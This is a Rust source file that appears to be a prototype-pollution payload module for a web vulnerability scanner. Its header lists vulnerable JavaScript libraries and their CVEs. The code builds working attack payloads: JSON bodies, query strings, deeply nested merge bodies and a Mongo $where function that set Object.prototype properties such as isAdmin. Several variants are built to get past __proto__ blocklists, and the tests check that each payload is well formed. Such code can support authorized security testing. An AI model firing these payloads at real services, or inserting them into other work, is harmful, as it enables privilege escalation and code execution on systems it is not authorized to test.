//! Server-side & client-side prototype pollution payload library.
//!
//! JavaScript's `Object.prototype` is shared across every object on the
//! page (or in the Node.js process). Polluting it means an attacker
//! sets `Object.prototype.X = Y` and every subsequent property lookup
//! that misses on a literal object falls through to that pollution.
//!
//! Real-world impact:
//!
//! - `Object.prototype.isAdmin = true` → every `if (user.isAdmin)`
//!   passes.
//! - `Object.prototype.shell = "/bin/sh"` → libraries that spawn child
//!   processes from `opts.shell` execute attacker shell.
//! - `Object.prototype.toString = "..."` → coercion-confusion in
//!   downstream templating.
//!
//! Three injection surfaces:
//!
//! 1. **JSON body** — the most common. POST a body where the JSON
//!    contains `__proto__` / `constructor.prototype`.
//! 2. **Query string** — `?__proto__[admin]=true`. Express's
//!    `qs.parse` historically constructed arbitrary nested objects.
//! 3. **Merge / clone helpers** — libraries like `lodash.merge`,
//!    `jquery.extend(true, ...)`, `defaultsDeep` walk the source's
//!    own-properties AND its `__proto__` chain. Send a body that
//!    nests `__proto__` 5 levels deep and the merge writes them onto
//!    the target's prototype.
//!
//! Plus the constructor variants — many libraries blocklist
//! `__proto__` but forget `constructor.prototype` walks to the same
//! place.
//!
//! Server-side targets:
//! - Express + body-parser (CVE-2018-3721, CVE-2019-10742, CVE-2021-3918)
//! - jQuery `.extend(true)` (CVE-2019-11358)
//! - Lodash `merge` / `set` / `setWith` / `defaultsDeep` / `mergeWith`
//!   (CVE-2019-10744, CVE-2020-8203)
//! - Hoek (CVE-2018-3728)
//! - Mongoose populate
//! - Handlebars / Pug template helpers that look up via `[]`
//!
//! Client-side (DOM XSS via gadgets):
//! - jQuery `$.parseHTML` + `$.htmlPrefilter` (CVE-2020-11023)
//! - Bootstrap `sanitizeHtml` gadget chain
//! - Sentry Browser SDK pre-2022 prototype-walk

use serde_json::{Value, json};

/// Build a JSON body that pollutes `Object.prototype.<prop> = <value>`.
/// Uses the `__proto__` shorthand — works against vulnerable parsers.
#[must_use]
pub fn json_proto_pollute(prop: &str, value: &str) -> String {
    let body = json!({
        "__proto__": {
            prop: value
        }
    });
    body.to_string()
}

/// Build a JSON body that pollutes via the `constructor.prototype`
/// path — bypasses blocklists that catch the `__proto__` key but
/// don't traverse arbitrary deep keys.
#[must_use]
pub fn json_constructor_pollute(prop: &str, value: &str) -> String {
    let body = json!({
        "constructor": {
            "prototype": {
                prop: value
            }
        }
    });
    body.to_string()
}

/// Build the lodash-`_.merge`-vulnerable payload. Each level uses
/// `__proto__` to walk to the prototype.
#[must_use]
pub fn lodash_merge_pollute(prop: &str, value: &str) -> String {
    // lodash.merge(target, JSON.parse(this)) writes
    // target.__proto__.prop = value if not guarded.
    let body = json!({
        "__proto__": {
            prop: value
        }
    });
    body.to_string()
}

/// Build the lodash-`_.set` / `_.setWith` payload via the
/// `constructor.prototype.X` dotted path. Some libraries take the
/// path as a STRING `"constructor.prototype.isAdmin"`.
#[must_use]
pub fn lodash_set_path() -> &'static str {
    "constructor.prototype.isAdmin"
}

/// Build a query-string payload that triggers prototype pollution on
/// `qs.parse(req.url, { allowPrototypes: true })` (or libraries with
/// the same default). Uses the `[__proto__]` bracket-notation form.
#[must_use]
pub fn querystring_proto_pollute(prop: &str, value: &str) -> String {
    // `qs.parse("__proto__[isAdmin]=true")` constructs an object
    // whose __proto__ is `{ isAdmin: "true" }`. Some parsers
    // coerce that into Object.prototype.isAdmin.
    format!("__proto__[{prop}]={value}")
}

/// Build a query-string payload that goes through the constructor
/// chain. Defeats parsers that explicitly blocklist `__proto__` in
/// the path.
#[must_use]
pub fn querystring_constructor_pollute(prop: &str, value: &str) -> String {
    format!("constructor[prototype][{prop}]={value}")
}

/// Build a query-string payload exploiting Express historical
/// behavior (`?a[__proto__][polluted]=yes` style). The double-bracket
/// confuses some parsers.
#[must_use]
pub fn express_qs_pollute(prop: &str, value: &str) -> String {
    format!("a[__proto__][{prop}]={value}")
}

/// Build a deep-nested JSON payload that mergeWith / defaultsDeep
/// will walk. Useful when the operator doesn't know which key gets
/// merged — every level of the target's structure gets a pollution
/// attempt.
#[must_use]
pub fn deep_merge_pollute(depth: u8, prop: &str, value: &str) -> String {
    let mut current = json!({ "__proto__": { prop: value } });
    for _ in 0..depth {
        current = json!({ "wrap": current });
    }
    current.to_string()
}

/// Build the `Object.assign` / `Object.create(null)` resilience-test
/// payload. Pure JSON object with no special keys — used as the
/// CONTROL when measuring whether a target is actually vulnerable.
#[must_use]
pub fn control_payload(prop: &str, value: &str) -> String {
    let body = json!({
        "normal_key": "normal_value",
        prop: value
    });
    body.to_string()
}

/// Build a JSON payload that uses BOTH `__proto__` and
/// `constructor.prototype` plus a few cousins (`prototype`,
/// `__defineGetter__`). Maximum coverage for unknown-library targets.
#[must_use]
pub fn comprehensive_proto_pollute(prop: &str, value: &str) -> String {
    let body: Value = json!({
        "__proto__": { prop: value },
        "constructor": {
            "prototype": { prop: value }
        },
        "prototype": { prop: value }
    });
    body.to_string()
}

/// Build a Mongoose / Mongo query payload that pollutes via the
/// `$where`/`$function` operators when the driver doesn't strip
/// dollar-prefixed keys. The pollution is via a function expression.
#[must_use]
pub fn mongo_query_pollute(prop: &str, value: &str) -> String {
    let body = json!({
        "$where": format!("function(){{this.__proto__.{}=\"{}\";return true;}}", prop, value)
    });
    body.to_string()
}

/// One-shot fan-out for a given (prop, value): every variant the
/// module knows. Used by the scan engine to fire the full pollution
/// surface in one corpus pass.
#[must_use]
pub fn all_pollution_payloads(prop: &str, value: &str) -> Vec<(String, String)> {
    vec![
        ("json-proto".to_string(), json_proto_pollute(prop, value)),
        ("json-constructor".to_string(), json_constructor_pollute(prop, value)),
        ("lodash-merge".to_string(), lodash_merge_pollute(prop, value)),
        ("qs-proto".to_string(), querystring_proto_pollute(prop, value)),
        ("qs-constructor".to_string(), querystring_constructor_pollute(prop, value)),
        ("express-qs".to_string(), express_qs_pollute(prop, value)),
        ("deep-merge-5".to_string(), deep_merge_pollute(5, prop, value)),
        ("comprehensive".to_string(), comprehensive_proto_pollute(prop, value)),
        ("mongo-where".to_string(), mongo_query_pollute(prop, value)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn json_proto_pollute_contains_dunder_key() {
        let p = json_proto_pollute("isAdmin", "true");
        assert!(p.contains("__proto__"));
        assert!(p.contains("isAdmin"));
        assert!(p.contains("true"));
    }

    #[test]
    fn json_proto_pollute_is_valid_json() {
        let p = json_proto_pollute("x", "y");
        let parsed: Value = serde_json::from_str(&p).expect("valid JSON");
        assert!(parsed.get("__proto__").is_some());
    }

    #[test]
    fn json_constructor_pollute_uses_chain() {
        let p = json_constructor_pollute("isAdmin", "true");
        assert!(p.contains("\"constructor\""));
        assert!(p.contains("\"prototype\""));
        // Does NOT use __proto__ — that's the blocklist-bypass point.
        assert!(!p.contains("__proto__"));
    }

    #[test]
    fn querystring_proto_pollute_uses_bracket() {
        let p = querystring_proto_pollute("isAdmin", "true");
        assert_eq!(p, "__proto__[isAdmin]=true");
    }

    #[test]
    fn querystring_constructor_pollute_chains() {
        let p = querystring_constructor_pollute("isAdmin", "true");
        assert_eq!(p, "constructor[prototype][isAdmin]=true");
    }

    #[test]
    fn express_qs_pollute_double_bracket() {
        let p = express_qs_pollute("isAdmin", "true");
        assert!(p.contains("a[__proto__][isAdmin]"));
    }

    #[test]
    fn deep_merge_pollute_nests_correctly() {
        let p = deep_merge_pollute(3, "X", "Y");
        let parsed: Value = serde_json::from_str(&p).expect("valid JSON");
        // 3 layers of "wrap" + 1 "__proto__".
        let mut node = &parsed;
        for _ in 0..3 {
            node = node.get("wrap").expect("wrap layer present");
        }
        assert!(node.get("__proto__").is_some());
    }

    #[test]
    fn deep_merge_pollute_zero_depth() {
        let p = deep_merge_pollute(0, "X", "Y");
        let parsed: Value = serde_json::from_str(&p).expect("valid JSON");
        assert!(parsed.get("__proto__").is_some());
    }

    #[test]
    fn control_payload_has_no_pollution_keys() {
        let p = control_payload("isAdmin", "true");
        assert!(!p.contains("__proto__"));
        assert!(!p.contains("\"constructor\""));
        assert!(p.contains("isAdmin"));
    }

    #[test]
    fn comprehensive_uses_three_paths() {
        let p = comprehensive_proto_pollute("X", "Y");
        assert!(p.contains("__proto__"));
        assert!(p.contains("\"constructor\""));
        assert!(p.contains("\"prototype\""));
    }

    #[test]
    fn lodash_set_path_known() {
        assert_eq!(lodash_set_path(), "constructor.prototype.isAdmin");
    }

    #[test]
    fn mongo_pollute_uses_dollar_where() {
        let p = mongo_query_pollute("isAdmin", "true");
        let parsed: Value = serde_json::from_str(&p).expect("valid JSON");
        assert!(parsed.get("$where").is_some());
    }

    #[test]
    fn all_pollution_payloads_count() {
        let payloads = all_pollution_payloads("X", "Y");
        assert!(payloads.len() >= 8);
        // Names are unique.
        let mut names: std::collections::HashSet<&str> = std::collections::HashSet::new();
        for (n, _) in &payloads {
            assert!(names.insert(n.as_str()), "duplicate variant name: {n}");
        }
    }

    #[test]
    fn all_pollution_each_variant_mentions_prop_or_value() {
        let payloads = all_pollution_payloads("magic-key", "magic-value");
        for (name, body) in &payloads {
            assert!(
                body.contains("magic-key") || body.contains("magic-value"),
                "variant {name} doesn't carry the marker: {body}"
            );
        }
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_pollution_payloads("a", "b");
        let b = all_pollution_payloads("a", "b");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_inputs_no_panic() {
        let big = "x".repeat(10_000);
        let _ = json_proto_pollute(&big, &big);
        let _ = deep_merge_pollute(100, &big, &big);
        let _ = all_pollution_payloads(&big, &big);
    }

    #[test]
    fn json_payloads_parse_clean() {
        let payloads = all_pollution_payloads("k", "v");
        for (name, body) in &payloads {
            // Skip query-string variants (they're not JSON).
            if name.starts_with("qs-") || name.starts_with("express-") {
                continue;
            }
            serde_json::from_str::<Value>(body).unwrap_or_else(|_| {
                panic!("{name} payload is not valid JSON: {body}")
            });
        }
    }

    #[test]
    fn special_chars_in_value_escaped_in_json() {
        let p = json_proto_pollute("k", "with\"quote");
        let parsed: Value = serde_json::from_str(&p).expect("valid JSON");
        let _ = parsed; // Just confirm it parses.
        assert!(p.contains("\\\""));
    }
}
